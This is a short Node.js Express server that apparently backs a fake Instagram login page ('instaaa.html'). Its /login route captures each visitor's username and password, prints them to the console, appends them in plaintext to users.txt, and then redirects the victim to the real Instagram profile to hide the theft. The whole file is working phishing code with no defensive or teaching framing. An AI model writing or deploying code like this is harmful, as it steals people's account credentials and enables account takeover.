const express=require('express');                                                                //import express library
const fs=require('fs');                                                                          //import file system to save data
const path=require('path');                                                                      //import to work with file paths
const app=express();                                                                             //to create an instance of express app
const port = process.env.PORT || 3000;                                                                      //define the port number

app.use(express.urlencoded({extended:true}));                                                    //to read form data


// ⭐ Serve static files like styles.css
app.use(express.static(__dirname));

app.get('/', (req, res) => {                                                                     // GET method route
  res.sendFile(path.join(__dirname,'instaaa.html'))
});                                                                                              //gives current foldr path

app.post('/login', (req, res) => {                                                              // POST method route
  const {username,password}=req.body;                                                           //get form value
  console.log(`new login:\n Username:${username}\n Password:${password}\n`);
  const userdata=`new user:\n Username:${username}\n Password:${password}\n`
  fs.appendFile("users.txt",userdata, (err) => {
    if (err) {
        console.log(err);
    }
    else {                                                                                      // Get the file contents after the append operation 
        res.redirect("https://www.instagram.com/"+ username);
    }
  }); 
})
            
app.listen(port, () => {                                                                        //run the server
  console.log(` app listening on  http://localhost:${port}`)
})
